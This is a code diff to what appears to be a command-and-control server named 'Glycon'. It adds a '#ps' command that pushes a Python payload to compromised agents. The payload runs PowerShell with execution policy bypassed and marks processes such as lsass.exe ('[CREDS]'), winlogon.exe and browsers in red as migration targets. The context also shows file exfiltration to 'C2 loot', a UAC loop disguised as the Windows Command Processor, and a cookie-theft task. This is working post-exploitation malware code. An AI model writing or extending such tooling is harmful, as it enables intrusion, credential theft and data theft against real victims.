@@ -233,6 +233,7 @@ def init_socket_handlers(socketio):
                 if cmd_type == 'help':
                     help_text = (
                         "\r\nGlycon Terminal Shortcuts:\r\n"
+                        "  #ps                - List processes with migration targets in red\r\n"
                         "  #help              - Show this help\r\n"
                         "  #upload            - Open file upload dialog\r\n"
                         "  #exfiltrate <file> - Download file from agent to C2 loot\r\n"
@@ -563,6 +564,87 @@ def uac_loop():
 
 threading.Thread(target=uac_loop, daemon=True).start()
 result = "UAC loop started using cmd.exe (masquerading as Windows Command Processor)"
+"""
+                    task_data = {'code': python_payload.strip()}
+                elif cmd_type == 'ps':
+                    task_type = 'execute_python'
+                    python_payload = """
+import subprocess
+import os
+
+def list_processes():
+    RED = "\\033[31m"
+    RESET = "\\033[0m"
+    BOLD = "\\033[1m"
+    YELLOW = "\\033[33m"
+    
+    # Definerer måltyper for bedre oversikt
+    TARGETS = {
+        "spoolsv.exe": "[SYSTEM TARGET]",
+        "explorer.exe": "[STABLE USER]",
+        "svchost.exe": "[STEALTH]",
+        "winlogon.exe": "[CRITICAL]",
+        "lsass.exe": "[CREDS]",
+        "notepad.exe": "[INTERACTION]",
+        "calc.exe": "[TESTING]",
+        "msedge.exe": "[BROWSER]",
+        "chrome.exe": "[BROWSER]",
+        "firefox.exe": "[BROWSER]",
+        "teams.exe": "[COMMUNICATION]",
+        "slack.exe": "[COMMUNICATION]"
+    }
+
+    ps_script = 'Get-Process | Select-Object Id, ProcessName, SessionId, UserName | ConvertTo-Csv -NoTypeInformation'
+    
+    try:
+        proc = subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script], 
+                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        stdout, _ = proc.communicate()
+        
+        if proc.returncode != 0:
+            ps_script = 'Get-Process | Select-Object Id, ProcessName, SessionId | ConvertTo-Csv -NoTypeInformation'
+            proc = subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script], 
+                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            stdout, _ = proc.communicate()
+
+        lines = stdout.strip().split('\\n')
+        if len(lines) < 2: return "Ingen prosesser funnet."
+
+        result_out = f"\\n{BOLD}{'PID':<8} {'Session':<10} {'Process Name':<25} {'User':<25} {'Target Type'}{RESET}\\n"
+        result_out += "-" * 95 + "\\n"
+
+        for line in lines[1:]:
+            line = line.strip()
+            if not line: continue
+            parts = [p.strip('"') for p in line.split(',')]
+            if len(parts) < 3: continue
+
+            pid, name, session = parts[0], parts[1], parts[2]
+            user = parts[3] if len(parts) > 3 else "N/A"
+            process_file = name.lower() + ".exe"
+            
+            target_note = TARGETS.get(process_file, "")
+            
+            # Logikk for utheving:
+            # Rød hvis det er i TARGETS listen, ellers Gul hvis det er en vanlig brukerprosess
+            is_high_value = process_file in TARGETS
+            is_user_proc = user != "N/A" and not any(s in user.upper() for s in ["SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE", "UMFD", "DWM"])
+            
+            row_str = f"{pid:<8} {session:<10} {name:<25} {user:<25} {target_note}"
+
+            if is_high_value:
+                result_out += f"{RED}{row_str}{RESET}\\n"
+            elif is_user_proc and pid != str(os.getpid()):
+                result_out += f"{YELLOW}{row_str}{RESET}\\n"
+            else:
+                result_out += f"{row_str}\\n"
+        
+        return result_out
+                
+    except Exception as e:
+        return f"Feil: {str(e)}"
+
+result = list_processes()
 """
                     task_data = {'code': python_payload.strip()}
                 elif cmd_type == 'cookies':
